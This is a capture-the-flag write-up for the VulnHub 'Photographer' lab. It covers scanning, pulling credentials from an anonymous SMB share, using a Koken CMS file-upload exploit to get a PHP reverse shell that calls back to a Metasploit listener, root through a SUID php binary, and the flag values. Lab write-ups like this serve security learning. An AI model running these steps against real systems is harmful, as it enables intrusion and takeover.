
# Photographer - CTF

Available on VulnHub: https://www.vulnhub.com/entry/photographer-1,519/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.186   08:00:27:87:49:96      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.186
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 19:07 -03
Nmap scan report for photographer.com (192.168.1.186)
Host is up (0.00021s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2021-04-03T18:07:48-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-03T22:07:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
```

## Web Analysis - Port 80

```
$ dirb http://192.168.1.186

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr  3 19:42:01 2021
URL_BASE: http://192.168.1.186/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.186/ ----
==> DIRECTORY: http://192.168.1.186/assets/                                                                          
==> DIRECTORY: http://192.168.1.186/images/                                                                          
+ http://192.168.1.186/index.html (CODE:200|SIZE:5711)                                                               
+ http://192.168.1.186/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.186/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.186/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Apr  3 19:42:03 2021
DOWNLOADED: 4612 - FOUND: 2
```

```
$ nikto -h http://192.168.1.186

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.186
+ Target Hostname:    192.168.1.186
+ Target Port:        80
+ Start Time:         2021-04-03 19:42:31 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 164f, size: 5aaf04d7cd1a0, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-04-03 19:43:30 (GMT-3) (59 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I did not find nothing with Web Analysis result for port 80.

## Web Analysis - Port 8000

```
$ dirb http://192.168.1.186:8000 -f | grep "CODE:200"

+ http://192.168.1.186:8000/index.php (CODE:200|SIZE:294)
+ http://192.168.1.186:8000/test (CODE:200|SIZE:0)
+ http://192.168.1.186:8000/admin/favicon.ico (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/admin/index.html (CODE:200|SIZE:77)
+ http://192.168.1.186:8000/app/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/cache/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/core/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/database/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/fonts/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/helpers/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/language/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/libraries/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/logs/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/plugins/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/site/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/storage/configuration/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/storage/custom/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/storage/plugins/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/storage/themes/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/storage/tmp/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/config/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/controllers/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/errors/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/helpers/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/hooks/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/httpd/index.html (CODE:200|SIZE:0)
+ http://192.168.1.186:8000/app/application/httpd/index.php (CODE:200|SIZE:294)
+ http://192.168.1.186:8000/app/application/libraries/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/models/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/application/views/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/database/drivers/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/language/english/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/libraries/javascript/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/site/tags/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/database/drivers/mssql/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/database/drivers/mysql/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/database/drivers/odbc/index.html (CODE:200|SIZE:11)
+ http://192.168.1.186:8000/app/site/themes/error/index.html (CODE:200|SIZE:57)
```

```
$ nikto -h http://192.168.1.186:8000

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.186
+ Target Hostname:    192.168.1.186
+ Target Port:        8000
+ Start Time:         2021-04-03 19:45:30 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-koken-cache' found, with contents: hit
+ All CGI directories 'found', use '-C none' to test none
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 1264, size: 5bf19350f48f1, mtime: gzip
+ Uncommon header 'x-xhr-current-location' found, with contents: http://192.168.1.186/
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /app/: This might be interesting...
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ /server-status: Apache server-status interface found (protected/forbidden)
+ 26547 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-04-03 19:48:50 (GMT-3) (200 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Koken admin login page: **http://192.168.1.186:8000/index.php**

## SMB Analysis

```
$ smbmap -H 192.168.1.186

[+] Guest session   	IP: 192.168.1.186:445	Name: photographer.com                                  
    Disk                Permissions Comment
	----                ----------- -------
	print$              NO ACCESS   Printer Drivers
	sambashare          READ ONLY   Samba on Ubuntu
	IPC$                NO ACCESS   IPC Service (photographer server (Samba, Ubuntu))
```

```
$ smbclient //192.168.1.186/sambashare
Enter WORKGROUP\burton's password: anonymous

smb: \> dir
  .                                   D        0  Mon Jul 20 22:30:07 2020
  ..                                  D        0  Tue Jul 21 06:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 22:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 22:22:23 2020

		278627392 blocks of size 1024. 264268400 blocks available

smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (98.2 KiloBytes/sec) (average 98.2 KiloBytes/sec)

smb: \> exit
$
```

```
$ cat mailsent.txt

Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

Credentials
* User: **daisa@photographer.com**
* Pass: **mygirl**

## Koken Admin Page Access

Now we are able to access Koken admin page with the previously acquired credentials.\
On admin page we can find the Koken version: **0.22.24**\
\
Looking for Koken 0.22.24 vulnerabilities or exploits.
```
$ searchsploit -w koken

------------------------------------------------------------------------ --------------------------------------------
 Exploit Title                                                          |  URL
------------------------------------------------------------------------ --------------------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)               | https://www.exploit-db.com/exploits/48706
------------------------------------------------------------------------ --------------------------------------------
```

## Exploitation

I just follow the steps of Exploit-DB vulnerability: `https://www.exploit-db.com/exploits/48706`.\
I uploaded the PHP reverse shell file (`reverse_shell.php`) using the steps described before.\
So I listened the connection in my host and called `http://192.168.1.186:8000/content/reverse_shell/`.
```
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set LHOST 192.168.1.189
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Command shell session 1 opened (192.168.1.189:4444 -> 192.168.1.186:37478) at 2021-04-03 19:59:33 -0300

Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 18:59:33 up  2:54,  0 users,  load average: 0.01, 0.28, 0.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

python -c 'import pty;pty.spawn("/bin/bash")'

www-data@photographer:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Flag #1 - User

```
www-data@photographer:/$ cat /home/daisa/user.txt
d41d8cd98f00b204e9800998ecf8427e
```

## Privilege Escalation

Looking for SUID binaries, we can find an unusual binary: `/usr/bin/php7.2`
```
www-data@photographer:/$ find / -type f -perm -u=s 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/sbin/pppd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2    <<<<<
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```

Using `GTFOBins`: https://gtfobins.github.io/gtfobins/php/
```
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
bash-4.3# 

bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

bash-4.3# whoami
root
```

## Flag #2 - Root

```
bash-4.3# cat proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com

d41d8cd************************
```
